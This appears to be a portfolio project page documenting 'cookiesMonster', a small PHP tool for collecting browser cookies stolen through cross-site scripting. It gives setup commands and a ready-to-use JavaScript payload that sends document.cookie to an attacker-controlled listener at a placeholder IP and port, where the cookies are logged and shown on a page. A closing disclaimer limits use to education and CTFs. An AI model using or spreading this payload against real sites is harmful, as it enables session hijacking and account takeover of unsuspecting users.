---
layout: page
title: cookiesMonster 🍪
description: A tool to collect cookies and show them in a web page. 
img: assets/img/projects/cookiesmonster/cookiesmonster.jpg
importance: 1
category: fun
related_publications: false
---

<div>
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/projects/cookiesmonster/cookiesmonster.jpg" title="CookiesMonster" class="img-fluid rounded z-depth-1" %}
    </div>
</div>



## Documentation 📖

This tool is to collect cookies via logs with XSS.

### Install requiriments 🔭

First you need to start the requiriments, you just need `php8.3`.

~~~bash
sudo apt install php8.3
~~~

#### Run the server 🏃

To run the server you need to be in the main directory of the project to then run the server with `PHP`.

```bash
php -S localhost:3333
```


### Collecting cookies 🗡️

You need to know how to do XSS Attacks to use this tool in a correct way, you have to add this URL `http://YOUR_IP:PORT/devil/devil.php?i=` to your script and then add the cookies, for example:

```js
new Image().src='http://YOUR_IP:PORT/devil/devil.php?i='+document.cookie;
```

Then you will have the cookie in the file `cookies.txt` and it will be displayed in the web page.


### cleaning cookies 🗑️

To clean cookies you just need to add an space the `cookies.txt` file, you can use this command:

```bash
echo " " > devil/cookies.txt
```


## DISCLAIMER ⚠️

This tool is for educational and CTF use only.
The author is not responsible for illegal use.
Unauthorized access is a crime in most countries and may carry legal penalties.
Use responsibly and only with proper permission.


---
# REFERENCE

- Project: [cookiesMonster](https://github.com/j4f3th/cookiesMonster)
---
